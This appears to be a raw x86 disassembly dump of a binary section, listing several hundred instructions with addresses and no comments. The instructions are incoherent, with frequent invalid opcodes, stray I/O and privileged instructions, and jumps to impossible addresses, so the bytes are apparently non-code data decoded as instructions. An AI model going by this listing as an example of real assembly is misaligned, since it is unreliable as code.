  4030c9:	adc    DWORD PTR [edi-0x6bfd9d0c],eax
  4030cf:	inc    esi
  4030d0:	cmp    cl,BYTE PTR [esp+edi*1]
  4030d3:	ftst   
  4030d5:	dec    edi
  4030d6:	fimul  DWORD PTR ds:0xff86c71c
  4030dc:	cmp    al,0x70
  4030de:	cmp    al,0x85
  4030e0:	sbb    edi,ebx
  4030e2:	jo     0x403160
  4030e4:	xor    BYTE PTR [edx+0x54897dd8],cl
  4030ea:	jmp    0x45def0d3
  4030ef:	sahf   
  4030f0:	in     al,dx
  4030f1:	inc    dl
  4030f3:	sub    BYTE PTR [ecx-0x1f],al
  4030f6:	les    bx,DWORD PTR [ecx-0xcc11ac8]
  4030fd:	sub    BYTE PTR [edi],dh
  4030ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403100:	sar    BYTE PTR [edi],cl
  403102:	mov    edi,0x7400b39a
  403107:	or     ebx,DWORD PTR [esi+0x1cfae24]
  40310d:	mov    edi,0xe09b58f
  403112:	or     BYTE PTR [ebx],bh
  403114:	push   es
  403115:	add    al,0x6c
  403117:	fs aaa 
  403119:	rol    BYTE PTR [esi],cl
  40311b:	mov    al,ds:0x5d408919
  403120:	popf   
  403121:	lds    edi,FWORD PTR [ecx-0x29]
  403124:	nop
  403125:	push   ds
  403126:	dec    eax
  403127:	imul   ecx,edx,0x27
  40312a:	mov    ds:0x978e22f9,al
  40312f:	push   cs
  403130:	mov    DWORD PTR [edi+0x132dc0af],ecx
  403136:	sbb    cl,cl
  403138:	adc    al,0xfe
  40313a:	pop    ss
  40313b:	aas    
  40313c:	xor    eax,0xb05ac3b1
  403141:	xor    al,0x6b
  403143:	sub    al,0x3f
  403145:	jle    0x403162
  403147:	cmp    BYTE PTR [ecx+0x30bb412],0xc7
  40314e:	mov    bh,0x7f
  403150:	xchg   esp,eax
  403151:	mov    esi,0xc1b67831
  403156:	sbb    BYTE PTR [edi+0x3e],bh
  403159:	mov    ah,0x96
  40315b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40315c:	mov    al,ds:0x96ad3d81
  403161:	mov    ebp,0xeb1f1f07
  403166:	xor    DWORD PTR ds:0xff25c6bc,edx
  40316c:	or     al,BYTE PTR [ecx+0x6f802f3c]
  403172:	sub    al,0xbb
  403174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403175:	xchg   DWORD PTR [ecx-0x9],eax
  403178:	imul   BYTE PTR [ebp-0x45]
  40317b:	jl     0x4031c7
  40317d:	or     ch,BYTE PTR ds:0x7555f230
  403183:	loopne 0x403179
  403185:	push   0xffffff8f
  403187:	retf   
  403188:	loope  0x4031cd
  40318a:	and    al,0x11
  40318c:	neg    ebx
  40318e:	ret    
  40318f:	xor    eax,0x59b65788
  403194:	mov    cl,bl
  403196:	(bad)  
  403197:	fs xchg DWORD PTR gs:[esi+0x673559e],ebp
  40319f:	hlt    
  4031a0:	cmc    
  4031a1:	call   0x292a:0x40271d9c
  4031a8:	mov    ch,0xfb
  4031aa:	icebp  
  4031ab:	mov    ch,0x37
  4031ad:	xchg   ebx,eax
  4031ae:	fld    QWORD PTR [edi]
  4031b0:	jecxz  0x403199
  4031b2:	int    0x25
  4031b4:	cmp    DWORD PTR [edi+0x3a33cc9f],0xffffff92
  4031bb:	cmp    ebx,DWORD PTR [ecx-0x6a]
  4031be:	xor    al,0x93
  4031c0:	and    DWORD PTR [ecx-0x55a8921],ebp
  4031c6:	mov    bl,0xe4
  4031c8:	mov    ebp,0x36c6fe10
  4031cd:	test   BYTE PTR [eax],dh
  4031cf:	mov    dh,0xf6
  4031d1:	les    ecx,FWORD PTR [ecx+edx*2]
  4031d4:	repz sar ah,0x6f
  4031d8:	stc    
  4031d9:	daa    
  4031da:	and    eax,0x86cfc80e
  4031df:	pop    edi
  4031e0:	sbb    cl,BYTE PTR [edi+0x6a]
  4031e3:	(bad)  
  4031e4:	pop    edx
  4031e5:	scas   eax,DWORD PTR es:[edi]
  4031e6:	popa   
  4031e7:	xchg   esi,eax
  4031e8:	pop    cx
  4031ea:	ror    BYTE PTR ds:0x773dd5d2,0xd9
  4031f1:	sbb    al,0x4
  4031f3:	and    al,0x3a
  4031f5:	dec    eax
  4031f6:	fstp   QWORD PTR [ebx+0x363f95a]
  4031fc:	jno    0x403197
  4031fe:	sbb    eax,0x29d2c995
  403203:	pop    ecx
  403204:	(bad)  
  403206:	inc    ecx
  403207:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403208:	jo     0x40318f
  40320a:	mov    ah,0xd4
  40320c:	dec    edi
  40320d:	lods   al,BYTE PTR ds:[esi]
  40320e:	mov    edx,0x29d3bc48
  403213:	je     0x4031dc
  403215:	push   ebx
  403216:	ins    DWORD PTR es:[edi],dx
  403217:	rol    BYTE PTR [esi+0x4a],1
  40321a:	iret   
  40321b:	cs jbe 0x4031ec
  40321e:	ja     0x40328c
  403220:	in     eax,0x52
  403222:	lea    ebx,[edi]
  403224:	daa    
  403225:	pop    es
  403226:	sbb    ah,ch
  403228:	add    eax,0x248bce24
  40322d:	pop    ecx
  40322e:	mov    ebp,0x16ad9b30
  403233:	sub    eax,0xea796ad0
  403238:	stc    
  403239:	or     esi,DWORD PTR ss:[eax-0x5f156f72]
  403240:	pop    ebp
  403241:	pop    ss
  403242:	ror    BYTE PTR [edx-0x632f40dc],1
  403248:	add    ah,cl
  40324a:	or     bl,cl
  40324c:	pushf  
  40324d:	fstp   QWORD PTR [ecx]
  40324f:	fstp   DWORD PTR [eax-0x56]
  403252:	out    0x47,al
  403254:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403255:	and    DWORD PTR [ebx],ebx
  403257:	mov    al,ds:0x8403c03b
  40325c:	or     DWORD PTR [eax+0x3a],edx
  40325f:	imul   edi,DWORD PTR [ebx+0x5e],0xd9102248
  403266:	mov    bh,BYTE PTR [ebp+0x1758c7de]
  40326c:	jae    0x403227
  40326e:	mov    ebx,0x303fa203
  403273:	pop    edi
  403274:	cmp    DWORD PTR [ebp+edx*1+0x32],ebx
  403278:	lds    ecx,FWORD PTR [eax+eax*2-0x15]
  40327c:	and    ebp,DWORD PTR [esi-0x65]
  40327f:	inc    esi
  403280:	and    dl,cl
  403282:	fild   DWORD PTR [edx+0x5c90c529]
  403288:	test   eax,0x6d74e081
  40328d:	push   0x43
  40328f:	in     al,dx
  403290:	fist   DWORD PTR [eax-0x6]
  403293:	cwde   
  403294:	add    al,0x9b
  403296:	jecxz  0x403301
  403298:	mov    esi,DWORD PTR [edi-0x50]
  40329b:	inc    ebx
  40329c:	dec    esi
  40329d:	outs   dx,BYTE PTR ds:[esi]
  40329e:	mov    ecx,0xc7e42215
  4032a3:	les    eax,FWORD PTR [ecx-0x55a0f3ca]
  4032a9:	int    0x1
  4032ab:	mov    dl,0x70
  4032ad:	mov    al,BYTE PTR [esi]
  4032af:	push   ecx
  4032b0:	int3   
  4032b1:	mov    eax,ds:0x295cd3d6
  4032b6:	mov    dl,0x54
  4032b8:	mov    WORD PTR [eax-0x775f47c1],gs
  4032be:	fsubr  DWORD PTR [eax-0x6af5f2fe]
  4032c4:	retf   
  4032c5:	mov    es,ebp
  4032c7:	and    dl,BYTE PTR [ecx]
  4032c9:	es out 0x8e,eax
  4032cc:	mov    ah,BYTE PTR [ebx-0x136188c9]
  4032d2:	dec    edx
  4032d3:	adc    edi,0xd69bff5b
  4032d9:	push   cs
  4032da:	fiadd  DWORD PTR [ebx+eiz*2+0x4773baf6]
  4032e1:	and    edx,DWORD PTR [eax+0x1e87d661]
  4032e7:	pop    ebp
  4032e8:	xchg   ah,al
  4032ea:	or     ecx,DWORD PTR [ecx+0xa]
  4032ed:	pop    ebp
  4032ee:	xor    edi,DWORD PTR [eax]
  4032f0:	icebp  
  4032f1:	xchg   edi,eax
  4032f2:	pop    ebp
  4032f3:	mov    eax,ds:0x4c3b5901
  4032f8:	xchg   esi,eax
  4032f9:	jle    0x4032af
  4032fb:	or     al,0xeb
  4032fd:	daa    
  4032fe:	daa    
  4032ff:	lds    esp,FWORD PTR [edi]
  403301:	adc    bl,dl
  403303:	mov    esi,0xc4ac436
  403308:	retf   
  403309:	push   esp
  40330a:	not    eax
  40330c:	jle    0x4032f5
  40330e:	test   al,0xaf
  403310:	jge    0x403299
  403312:	jmp    0x40333b
  403314:	int3   
  403315:	jge    0x4032da
  403317:	lea    ebx,[ebp+0x5891ebab]
  40331d:	pop    esp
  40331e:	xor    BYTE PTR [ecx-0x2],dh
  403321:	dec    edi
  403322:	sub    al,0xfe
  403324:	js     0x403395
  403326:	pop    ebx
  403327:	cmp    esp,DWORD PTR [esi-0x7e09087]
  40332d:	or     ch,BYTE PTR [edx+edx*1]
  403330:	jno    0x4033b0
  403332:	and    eax,0x3181111f
  403337:	xchg   DWORD PTR [ebx+0x5],ecx
  40333a:	xchg   BYTE PTR [ebx],bh
  40333c:	in     eax,dx
  40333d:	fdiv   QWORD PTR [edi-0x72]
  403340:	mov    esi,ds
  403342:	pop    ebx
  403343:	and    eax,0x5d1fa24b
  403348:	jne    0x403383
  40334a:	inc    esp
  40334b:	fmul   DWORD PTR [eax+ebx*1-0x54]
  40334f:	std    
  403350:	sbb    al,0xbe
  403352:	int    0x76
  403354:	shl    DWORD PTR [edi+ebx*8-0x60225ae1],0xd4
  40335c:	or     ecx,DWORD PTR [ebx]
  40335e:	aas    
  40335f:	sbb    edi,DWORD PTR [ebx]
  403361:	adc    DWORD PTR [esi*1-0x2542e6f8],ebx
  403368:	cmp    ecx,DWORD PTR [edx]
  40336a:	fs xchg edi,eax
  40336c:	jle    0x403323
  40336e:	inc    ebp
  40336f:	adc    BYTE PTR [ebp+0x1f5b3f6b],bl
  403375:	iret   
  403376:	dec    ebp
  403377:	lea    ebx,[ebx+eax*4+0x28415489]
  40337e:	jae    0x40337d
  403380:	pop    edx
  403381:	(bad)
  403384:	ja     0x4033b8
  403386:	mul    BYTE PTR [edx-0x3f55b0e2]
  40338c:	sti    
  40338d:	dec    ebp
  40338e:	dec    edx
  40338f:	mov    dh,0xc4
  403391:	int3   
  403392:	cmp    eax,0x7faf2f32
  403397:	arpl   WORD PTR [ebx+edx*1+0x1a45993b],dx
  40339e:	mov    ah,0x8b
  4033a0:	in     al,dx
  4033a1:	xor    DWORD PTR [esi+0x3d],esi
  4033a4:	mov    dh,0xfa
  4033a6:	(bad)  
  4033a8:	push   0x10
  4033aa:	out    0xc7,al
  4033ac:	jne    0x40342a
  4033ae:	in     al,dx
  4033af:	or     eax,0x1975ac42
  4033b4:	xchg   edx,eax
  4033b5:	xlat   BYTE PTR ds:[ebx]
  4033b6:	lods   al,BYTE PTR ds:[si]
  4033b8:	pop    ebx
  4033b9:	jo     0x403386
  4033bb:	test   eax,0xad47249d
  4033c0:	push   edi
  4033c1:	adc    al,dh
  4033c3:	pop    ebx
  4033c4:	mov    eax,ds:0x1ce39259
  4033c9:	jmp    DWORD PTR [ebx]
  4033cb:	cmc    
  4033cc:	clc    
  4033cd:	ja     0x4033b5
  4033cf:	int    0xf5
  4033d1:	cmp    esp,DWORD PTR [edx-0x13]
  4033d4:	xor    DWORD PTR [edi+0x7f],edx
  4033d7:	out    0x3a,al
  4033d9:	(bad)  
  4033da:	into   
  4033db:	les    esi,FWORD PTR [esi-0x2d]
  4033de:	jae    0x4033aa
  4033e0:	sbb    ch,BYTE PTR [ecx+eax*8+0x344af2ee]
  4033e7:	mov    ecx,DWORD PTR [eax+0x8]
  4033ea:	sub    eax,0xe88d9bd0
  4033ef:	mov    esi,0x312b9f85
  4033f4:	retf   
  4033f5:	mov    ds:0x4cc7ba7a,al
  4033fa:	retf   0x77ef
  4033fd:	out    0x3,al
  4033ff:	xlat   BYTE PTR ds:[ebx]
  403400:	mov    ecx,0xea35d856
  403405:	xchg   esi,eax
  403406:	jmp    0x4033b5
  403408:	bound  esp,QWORD PTR [edx-0x34049bd9]
  40340e:	adc    eax,0x2a1f9439
  403413:	(bad)  
  403414:	and    edi,esi
  403416:	nop
  403417:	pop    ss
  403418:	aad    0x37
  40341a:	sbb    eax,0xbbf8a60
  40341f:	pop    ds
  403420:	(bad)  
  403421:	cli    
  403422:	sub    eax,0x55a68d40
  403427:	mov    WORD PTR [edi-0x66],gs
  40342a:	pop    ebp
  40342b:	test   eax,0x44892cd8
  403430:	ss inc ecx
  403432:	es icebp 
  403434:	and    al,0x9f
  403436:	loop   0x403448
  403438:	outs   dx,BYTE PTR ds:[esi]
  403439:	dec    ecx
  40343a:	imul   esp,DWORD PTR [esi],0x66
  40343d:	(bad)  
  40343e:	xchg   ebx,eax
  40343f:	sbb    DWORD PTR [ebp-0x4a],esp
  403442:	lods   al,BYTE PTR ds:[esi]
  403443:	pop    edx
  403444:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403445:	fistp  QWORD PTR ds:0x3e9f6c38
  40344b:	(bad)  
  40344c:	sbb    BYTE PTR [ebx-0x51],al
  40344f:	cmp    al,0xd1
  403451:	xchg   esi,eax
  403452:	icebp  
  403453:	leave  
  403454:	pop    eax
  403455:	adc    eax,0xc52ea582
  40345a:	neg    BYTE PTR [esi]
  40345c:	xor    eax,0x9f54d9e9
  403461:	xor    ebx,DWORD PTR [edi]
  403463:	icebp  
  403464:	jae    0x403444
  403466:	repnz mul eax
  403469:	inc    eax
  40346a:	loope  0x40341d
  40346c:	lock and BYTE PTR [ebx],ah
  40346f:	xor    BYTE PTR [edi+0x5b],dh
  403472:	leave  
  403473:	adc    ebp,DWORD PTR [edx]
  403475:	xchg   esi,eax
  403476:	into   
  403477:	aas    
  403478:	clc    
  403479:	mov    BYTE PTR [ebp+0x7],bl
  40347c:	pop    ecx
  40347d:	mov    bh,BYTE PTR [eax]
  40347f:	arpl   WORD PTR [esi+0x3e],dx
  403482:	xor    ebp,esi
  403484:	or     bh,bl
  403486:	push   esp
  403487:	and    al,0xb0
  403489:	pop    edx
  40348a:	repz add ebx,edx
  40348d:	push   eax
  40348e:	stos   DWORD PTR es:[edi],eax
  40348f:	or     DWORD PTR [edi],0x27
  403492:	aam    0xfc
  403494:	adc    DWORD PTR [edx-0x2016a8bc],edi
  40349a:	adc    ah,BYTE PTR [ebp-0x3bf53c5]
  4034a0:	sbb    esi,esi
  4034a2:	xor    al,0xea
  4034a4:	int3   
  4034a5:	push   es
  4034a6:	cmp    cl,BYTE PTR [edx-0x6a]
  4034a9:	inc    eax
  4034aa:	xchg   DWORD PTR [esi],eax
  4034ac:	xor    cl,BYTE PTR [eax-0xa626943]
  4034b2:	or     bh,bh
  4034b4:	repnz dec ebx
  4034b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034b7:	push   0xffffff81
  4034b9:	hlt    
  4034ba:	fcomp  QWORD PTR [eax-0x71ea8555]
  4034c0:	jno    0x4034f4
  4034c2:	int    0xf1
  4034c4:	inc    esi
  4034c5:	mov    bl,0xb8
  4034c7:	retf   
  4034c8:	adc    dh,dh
  4034ca:	or     esp,DWORD PTR [esi]
  4034cc:	mov    cl,0x34
  4034ce:	jae    0x403497
  4034d0:	push   es
  4034d1:	adc    al,0x89
  4034d3:	xor    al,0x66
  4034d5:	lods   eax,DWORD PTR ds:[esi]
  4034d6:	test   BYTE PTR [ebp+0x481ff824],ch
  4034dc:	mov    eax,ds:0x63c2248a
  4034e1:	and    dl,BYTE PTR [edi+esi*2+0x46]
  4034e5:	mov    ebx,0xb481bfe8
  4034ea:	xor    ecx,esp
  4034ec:	stc    
  4034ed:	pop    ecx
  4034ee:	lahf   
  4034ef:	add    al,0x40
  4034f1:	pop    eax
  4034f2:	and    al,0xff
  4034f4:	arpl   WORD PTR [eax],sp
  4034f6:	popf   
  4034f7:	aad    0x5f
  4034f9:	jae    0x4034f2
  4034fb:	scas   al,BYTE PTR es:[edi]
  4034fc:	pop    edx
  4034fd:	(bad)
  403500:	das    
  403501:	pop    esi
  403502:	popa   
  403503:	push   ebx
  403504:	pop    ss
  403505:	shr    ebp,0xb6
  403508:	or     edi,DWORD PTR [esi]
  40350a:	aaa    
  40350b:	arpl   WORD PTR [esp+ebx*1-0x631609ca],bp
  403512:	sahf   
  403513:	jae    0x4034ba
  403515:	daa    
  403516:	popa   
  403517:	rcr    BYTE PTR [ebp-0x6325d05e],cl
  40351d:	pop    ds
  40351e:	gs mov ebp,0x50cade4d
  403524:	push   es
  403525:	and    eax,0x16302178
  40352a:	or     al,0xbb
  40352c:	sub    dl,BYTE PTR [esp+eiz*8]
  40352f:	mul    DWORD PTR [ecx-0x3e0b2043]
  403535:	rcr    eax,cl
  403537:	sub    al,ch
  403539:	jmp    0xd55bb287
  40353e:	and    ch,ch
  403540:	dec    ebp
  403541:	jae    0x403539
  403543:	fstp   TBYTE PTR [ebp+0x68]
  403546:	sbb    eax,0x6f8552e6
  40354b:	stos   BYTE PTR es:[edi],al
  40354c:	jmp    0x9e9745bc
  403551:	mov    ecx,0xfc178233
  403556:	mov    esp,0x3b3daa0
  40355b:	dec    ecx
  40355c:	jbe    0x403580
  40355e:	mov    ch,0x82
  403560:	jle    0x4035cf
  403562:	je     0x4035a5
  403564:	iret   
  403565:	xor    ebp,DWORD PTR [esp+eax*8]
  403568:	mov    edi,DWORD PTR ds:0x6964399c
  40356e:	mov    eax,ds:0x7b51a5b6
  403573:	enter  0x81d,0x3f
  403577:	lock pop edx
  403579:	push   ecx
  40357a:	or     ch,dh
  40357c:	jno    0x4035ab
  40357e:	and    bl,BYTE PTR [edx+eiz*2]
  403581:	rol    BYTE PTR [edx],cl
  403583:	fst    DWORD PTR [esi]
  403585:	jmp    0x4035b2
  403587:	dec    eax
  403588:	cmp    edx,ebp
  40358a:	cmp    DWORD PTR [eax+0x6d3f7588],esi
  403590:	jno    0x40356f
  403592:	int    0x2b
  403594:	adc    eax,0x6f2d7c52
  403599:	std    
  40359a:	arpl   WORD PTR [esi+ebx*1-0x3dab5e2c],dx
  4035a1:	push   ebx
  4035a2:	(bad)  
  4035a3:	rol    ah,cl
  4035a5:	or     BYTE PTR [ebx+0x2a19a457],ch
  4035ab:	fcomi  st,st(4)
  4035ad:	stos   DWORD PTR es:[edi],eax
  4035ae:	std    
  4035af:	bound  edx,QWORD PTR [eax]
  4035b1:	pop    ecx
  4035b2:	cmp    DWORD PTR [ecx],ebx
  4035b4:	(bad)  
  4035b6:	jo     0x403615
  4035b8:	ins    BYTE PTR es:[di],dx
  4035ba:	in     eax,dx
  4035bb:	popa   
  4035bc:	mov    al,0xd6
  4035be:	inc    ecx
  4035bf:	sti    
  4035c0:	mov    ebp,0x88977c1
  4035c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035c6:	fmul   DWORD PTR [edi]
  4035c8:	add    ecx,ebp
  4035ca:	dec    esi
  4035cb:	out    dx,eax
  4035cc:	sbb    DWORD PTR [ecx+0x26],edx
  4035cf:	out    0x30,al
  4035d1:	(bad)  
  4035d2:	hlt    
  4035d3:	loop   0x4035e7
  4035d5:	push   0x91cf8e74
  4035da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035db:	out    dx,eax
  4035dc:	fld    DWORD PTR [esi]
  4035de:	das    
  4035df:	push   ss
  4035e0:	rol    BYTE PTR [edx],0xa0
  4035e3:	mov    ch,0x93
  4035e5:	jecxz  0x4035d5
  4035e7:	xchg   esi,eax
  4035e8:	sub    eax,0xfa65cd74
  4035ed:	mov    dh,0xc1
  4035ef:	stos   DWORD PTR es:[edi],eax
  4035f0:	std    
  4035f1:	js     0x40360c
  4035f3:	or     al,0xb2
  4035f5:	in     eax,dx
  4035f6:	loopne 0x403582
  4035f8:	add    ch,ah
  4035fa:	pop    edi
  4035fb:	cmp    BYTE PTR [edi-0x59],0x35
  4035ff:	dec    ecx
  403600:	xor    eax,0xe33a91c6
  403605:	das    
  403606:	pop    eax
  403607:	sbb    edi,DWORD PTR [ebx]
  403609:	neg    ch
  40360b:	inc    ebp
  40360c:	int3   
  40360d:	push   ds
  40360e:	jge    0x403633
  403610:	jg     0x403641
  403612:	sbb    DWORD PTR [eax-0x43],0x649d96
  403619:	dec    edx
  40361a:	in     al,dx
  40361b:	scas   al,BYTE PTR es:[edi]
  40361c:	mov    esp,0xd78c25e4
  403621:	xchg   DWORD PTR [eax-0x14],eax
  403624:	call   0xf76aa3f1
  403629:	and    al,0x3b
  40362b:	nop
  40362c:	xchg   DWORD PTR [ebp-0x32],esi
  40362f:	add    esi,DWORD PTR [ebx+0x6945ce14]
  403635:	sbb    eax,0x85eb99d5
  40363a:	stos   DWORD PTR es:[edi],eax
  40363b:	ins    BYTE PTR es:[edi],dx
  40363c:	sbb    esi,DWORD PTR [ebp+0x15]
  40363f:	mov    al,ds:0xd0a8d4c2
  403644:	jl     0x40365c
  403646:	dec    edi
  403647:	xchg   edx,eax
  403648:	dec    ebx
  403649:	js     0x403662
  40364b:	adc    ebp,0xfffffff7
  40364e:	xchg   edi,eax
  40364f:	mov    cl,0xae
  403651:	jo     0x403689
  403653:	in     al,dx
  403654:	xlat   BYTE PTR ds:[ebx]
  403655:	stos   DWORD PTR es:[edi],eax
  403656:	ds scas eax,DWORD PTR es:[edi]
  403658:	shl    DWORD PTR [ebp+0xc],cl
  40365b:	cmp    eax,0xccfb30a7
  403660:	cmp    DWORD PTR [eax],edi
  403662:	pop    ecx
  403663:	loope  0x4035e6
  403665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403666:	ret    
  403667:	push   ebp
  403668:	fimul  WORD PTR [edx-0x6]
  40366b:	push   es
  40366c:	or     al,0x6d
  40366f:	sub    al,0x88
  403671:	jno    0x403620
  403673:	cs (bad) 
  403675:	fwait
  403676:	ret    
  403677:	or     ecx,DWORD PTR [eax]
  403679:	mov    bh,0x6c
  40367b:	xor    DWORD PTR [ebx+0x7e721773],0x9
  403682:	(bad)  
  403683:	in     eax,dx
  403684:	sub    BYTE PTR [ebp+0xb],al
  403687:	xchg   ebp,eax
  403688:	sbb    ebp,eax
  40368a:	and    esi,ebx
  40368c:	jp     0x403698
  40368e:	mov    ecx,0xf77e71f2
  403693:	mov    dh,BYTE PTR [edi]
  403695:	or     eax,0xec38d610
  40369a:	repz (bad) 
  40369c:	and    eax,0x3f8c1883
  4036a1:	mov    ch,dl
  4036a3:	mov    ?,ebp
  4036a5:	and    esp,DWORD PTR [esi]
  4036a7:	push   eax
  4036a8:	xchg   esi,eax
  4036a9:	ret    
  4036aa:	fbstp  TBYTE PTR [edx*1+0x6157c301]
  4036b1:	(bad)  
  4036b2:	mov    ecx,0xb0d171c8
  4036b7:	jmp    0xe7e2:0x70ac2d1d
  4036be:	jp     0x403672
  4036c0:	aaa    
  4036c1:	into   
  4036c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036c3:	push   ss
  4036c4:	loop   0x403649
  4036c6:	jae    0xd186828a
  4036cc:	pop    ebx
  4036cd:	sub    DWORD PTR ds:[ecx-0x470a231d],esi
  4036d4:	popa   
  4036d5:	retf   
  4036d6:	mov    edx,0x67ab8707
  4036db:	push   ebx
  4036dc:	pop    ebx
  4036dd:	mov    ?,ebx
  4036df:	and    eax,0x3413b68d
  4036e4:	das    
  4036e5:	and    BYTE PTR ds:0x874a6f45,dh
  4036eb:	(bad)  
  4036ec:	adc    ecx,DWORD PTR [ecx+0x55148e0a]
  4036f2:	cmp    eax,0xf6cf2a7d
  4036f7:	icebp  
  4036f8:	mov    edx,esp
  4036fa:	scas   al,BYTE PTR es:[edi]
  4036fb:	xchg   ebp,eax
  4036fc:	push   ebp
  4036fd:	cmp    ch,BYTE PTR [ebp+0x1]
  403700:	aad    0x7d
  403702:	aas    
  403703:	cmp    DWORD PTR [esi+eiz*8+0x16b5b09d],0xb4a7f56f
  40370e:	jne    0x4036f9
  403710:	(bad)  
  403712:	mov    ds:0x8c61db28,al
  403717:	adc    bh,BYTE PTR [ecx+0x707b82fd]
  40371d:	das    
  40371e:	pop    edx
  40371f:	fbstp  TBYTE PTR [edi+0x4c]
  403722:	fdiv   QWORD PTR [ebx+0xf]
  403725:	fcom   DWORD PTR [eax+0x26]
  403728:	mov    edx,0x734c7828
  40372d:	push   ecx
  40372e:	stos   DWORD PTR es:[edi],eax
  40372f:	(bad)  
  403730:	xchg   esi,eax
  403731:	fstp   TBYTE PTR [edi]
  403733:	stos   DWORD PTR es:[edi],eax
  403734:	clc    
  403735:	fnsave [ebp-0x1637b422]
  40373b:	fucomi st,st(1)
  40373d:	dec    edx
  40373e:	xor    ch,dh
  403740:	or     cl,BYTE PTR [eax-0x48fa0949]
  403746:	inc    ebp
  403747:	push   edi
  403748:	mov    ebp,0x40e9e84a
  40374d:	jae    0x403782
  40374f:	enter  0x16b,0x75
  403753:	mov    bh,0x7f
  403755:	jmp    0x40376a
  403757:	fs ds inc ebp
  40375a:	push   ebx
  40375b:	jmp    0xd71074e6
  403760:	scas   al,BYTE PTR es:[edi]
  403761:	and    eax,DWORD PTR [edi-0x4b]
  403764:	push   esp
  403765:	sti    
  403766:	call   DWORD PTR [ebx]
  403768:	push   es
  403769:	mov    WORD PTR [eax+0x7efeba5a],gs
  40376f:	adc    eax,0xc45dc495
  403774:	shl    DWORD PTR [edi+eiz*2+0xde0166c],1
  40377b:	test   al,0x6e
  40377d:	inc    esp
  40377e:	jge    0x4037c5
  403780:	cmp    DWORD PTR [esi],esp
  403782:	dec    esi
  403783:	addr16 pop ebx
  403785:	popf   
  403786:	ror    DWORD PTR [ebx],cl
  403788:	push   ecx
  403789:	stos   BYTE PTR es:[edi],al
  40378a:	xchg   esp,eax
  40378b:	and    DWORD PTR [ebx+ecx*2-0x58],edx
  40378f:	xor    DWORD PTR [ebp+0x48],ecx
  403792:	imul   ecx,DWORD PTR [edx-0x2b77f6a2],0x2a
  403799:	sub    eax,0xce13cba8
  40379e:	sbb    ebx,DWORD PTR [esi]
  4037a0:	sbb    dl,BYTE PTR [edi-0x26b514d2]
  4037a6:	sub    BYTE PTR [ebp-0x42d1bbb3],cl
  4037ac:	dec    ebx
  4037ad:	imul   ebx,DWORD PTR [ebp-0x7809337d],0x36
  4037b4:	xchg   esp,eax
  4037b5:	sbb    DWORD PTR [ecx-0x55],ebx
  4037b8:	(bad)  
  4037b9:	stc    
  4037ba:	mov    ch,cl
  4037bc:	mov    dl,0x7b
  4037be:	cmc    
  4037bf:	mov    esi,0xb283bb5c
  4037c4:	cli    
  4037c5:	shr    DWORD PTR [ebx],cl
  4037c7:	ins    BYTE PTR es:[edi],dx
  4037c8:	mov    esp,0x1d4b0d77
  4037cd:	dec    edx
  4037ce:	inc    ecx
  4037cf:	push   cs
  4037d0:	push   eax
  4037d1:	mov    ebp,0xd1b9f932
  4037d6:	adc    DWORD PTR [esp+edx*2-0x77],ebp
  4037da:	push   ds
  4037db:	jo     0x403768
  4037dd:	jo     0x403834
  4037df:	sub    ebx,DWORD PTR [esi+0x4d]
  4037e2:	jns    0x4037cf
  4037e4:	adc    ah,bl
  4037e6:	push   ebp
  4037e7:	int    0x74
  4037e9:	xor    eax,0xc2985a25
  4037ee:	(bad)  
  4037ef:	jnp    0x403853
  4037f1:	(bad)  
  4037f3:	push   edx
  4037f4:	inc    eax
  4037f5:	and    DWORD PTR [ebp+0x49],eax
  4037f8:	ret    0x13ea
  4037fb:	mov    eax,ds:0xca491f2c
  403800:	xchg   DWORD PTR [edx+edi*8+0x5e],ecx
  403804:	xchg   ecx,eax
  403805:	jg     0x403816
  403807:	push   edx
  403808:	jp     0x4037a6
  40380a:	ret    
  40380b:	sub    eax,0x238fa3de
  403810:	ret    
  403811:	lock call 0xbb39189
  403817:	and    DWORD PTR [ebp-0x19ccbb63],esp
  40381d:	shl    edi,0xd4
  403820:	add    BYTE PTR [eax-0x6859daa3],dh
  403826:	push   edi
  403827:	fwait
  403828:	mov    ds:0x6c8dfe0e,eax
  40382d:	mov    edx,0x7355d066
  403832:	jecxz  0x4037b6
  403834:	call   FWORD PTR [eax]
  403836:	ins    DWORD PTR es:[edi],dx
  403837:	mov    eax,ds:0x9e5b2083
  40383c:	jo     0x4037ca
  40383e:	loopne 0x403858
  403840:	add    BYTE PTR [edi],dl
  403842:	inc    esp
  403843:	seto   bh
  403846:	lods   eax,DWORD PTR ds:[esi]
  403847:	cli    
  403848:	mov    esi,0x389b00fa
  40384d:	lea    ebp,[ebp-0x3a]
  403850:	int3   
  403851:	jg     0x4038c5
  403853:	jmp    0x1de3024d
  403858:	rol    esp,0x5f
  40385b:	les    ebp,FWORD PTR [ecx]
  40385d:	pop    ecx
  40385e:	stc    
  40385f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403860:	or     eax,0x8c5bbe81
  403865:	repnz outs dx,DWORD PTR ds:[esi]
  403867:	adc    edx,0xffffffd9
  40386a:	xchg   edx,eax
  40386b:	ficomp WORD PTR ds:0x87a575d
  403871:	push   esi
  403872:	dec    edx
  403873:	mov    ecx,DWORD PTR [eax]
  403875:	js     0x4038b0
  403877:	shl    edi,cl
  403879:	inc    esp
  40387a:	(bad)  
  40387b:	push   0x49af341f
  403880:	pop    ebx
  403881:	sub    DWORD PTR [ecx+0x77bac8c9],esp
  403887:	retf   
  403888:	inc    eax
  403889:	aam    0x5e
  40388b:	cli    
  40388c:	test   al,0x60
  40388e:	stc    
  40388f:	icebp  
  403890:	test   al,bh
  403892:	push   esi
  403893:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403894:	int    0xe0
  403896:	cwde   
  403897:	not    DWORD PTR [esi+0x74446b2a]
  40389d:	push   0x53
  40389f:	icebp  
  4038a0:	dec    edx
  4038a1:	out    0x2f,eax
  4038a3:	ss cli 
  4038a5:	stos   BYTE PTR es:[edi],al
